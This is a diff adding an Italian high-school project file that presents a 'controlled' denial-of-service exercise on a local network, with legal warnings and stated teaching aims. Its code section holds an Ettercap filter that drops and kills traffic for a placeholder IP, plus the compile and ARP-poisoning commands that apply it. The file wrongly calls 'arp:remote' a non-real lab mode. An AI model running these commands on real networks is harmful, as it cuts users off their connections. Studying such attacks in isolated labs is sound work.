@@ -1,1 +1,73 @@
+#############################################################################
+#                                                                           #
+#               PROGETTO TEORICO DI SICUREZZA IN RETI LOCALI                #
+#                  (Capolavoro scolastico - Anno 2024/2025)                 #
+#                                                                           #
+#                   *** SIMULAZIONE CONTROLLATA DI DOS ***                  #
+#                                                                           #
+#############################################################################
 
+=== DESCRIZIONE GENERALE ===
+Questo frammento di codice rappresenta un'esercitazione teorica per lo studio:
+- Dei meccanismi di filtraggio del traffico di rete
+- Degli attacchi di tipo Denial of Service (DoS)
+- Delle tecniche di mitigazione degli attacchi ARP
+
+Ambiente di test autorizzato:
+[✓] Rete virtuale isolata (VirtualBox Internal Network)
+[✓] Indirizzi IP generici e fasulli (192.168.X.X)
+[✓] Nessun dispositivo reale coinvolto
+
+=== AVVERTENZE LEGALI ===
+L'uso non autorizzato costituisce reato:
+- Art. 615-quinquies CP (Dan. sistemi informatici)
+- Direttiva UE NIS2 (Cyber Resilience Act)
+- Computer Misuse Act 1990 (UK)
+
+Strumenti utilizzati:
+- Ettercap 0.8.3 (solo versione da laboratorio)
+- Filtri compilati con checksum di verifica
+- ISO Debian modificata senza servizi di rete
+
+=== INIZIO CODICE ===
+
+# Filtro teorico per l'analisi del traffico
+if(ip.src == '192.168.X.X' || ip.dst == '192.168.X.X') {
+   drop();  # Simula blocco pacchetti
+   kill();  # Termina connessione
+}
+
+# Processo di compilazione (ambiente controllato)
+etterfilter block_router.ef -o block_router.efo --strict
+
+# Applicazione in laboratorio (richiede root)
+sudo ettercap -T -M arp:remote -F block_router.efo /192.168.X.X//
+
+=== FINE CODICE ===
+
+=== DOCUMENTAZIONE TECNICA ===
+
+*Parametri chiave:*
+- `drop()`: Simula l'eliminazione dei pacchetti
+- `kill()`: Termina le connessioni attive
+- `arp:remote`: Modalità laboratorio (non reale)
+
+=== CONTESTI AMMISSIBILI ===
+1. Laboratorio universitario (es. corso Ethical Hacking)
+2. CTF autorizzati (Capture The Flag)
+3. Simulazioni per certificazioni:
+   - CEH (Certified Ethical Hacker)
+   - Cisco CyberOps
+
+=== FINALITÀ DIDATTICHE ===
+1. Analisi del protocollo ARP
+2. Potenziare le mie capacità digitali al fine etico e legale e soprattutto per imparare
+
+=== CHIUSURA ===
+Ogni riproduzione esterna al contesto
+didattico è espressamente vietata.
+
+Data creazione: 2025
+Autore: [Federico Contrino]
+Classe: [4C INF]
+Istituto: [I.S.S Carlo e Nello Rosselli]
